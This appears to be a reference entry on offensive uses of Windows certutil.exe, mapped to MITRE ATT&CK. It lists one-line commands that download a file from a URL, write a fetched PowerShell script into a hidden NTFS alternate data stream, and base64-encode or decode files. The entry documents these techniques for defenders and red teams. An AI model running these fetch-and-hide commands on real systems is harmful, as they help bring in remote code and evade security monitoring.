## Certutil.exe

* Functions: Download, Add ADS, Decode, Encode

```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe    
    
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt    
    
certutil -encode inputFileName encodedOutputFileName   
    
certutil -decode encodedInputFileName decodedOutputFileName
```

Acknowledgements:
* Matt Graeber - @mattifestation
* Moriarty - @Moriarty2016

Code sample:
* 

Resources:
* https://twitter.com/Moriarty_Meng/status/984380793383370752
* https://twitter.com/mattifestation/status/620107926288515072

Full path:
```
c:\windows\system32\certutil.exe
c:\windows\sysWOW64\certutil.exe
```

Notes:



 
MITRE ATT&CK:
* [NTFS File Attributes](https://attack.mitre.org/wiki/Technique/T1096)
* [Deobfuscate/Decode Files or Information](https://attack.mitre.org/wiki/Technique/T1140)
* [Remote File Copy](https://attack.mitre.org/wiki/Technique/T1105)
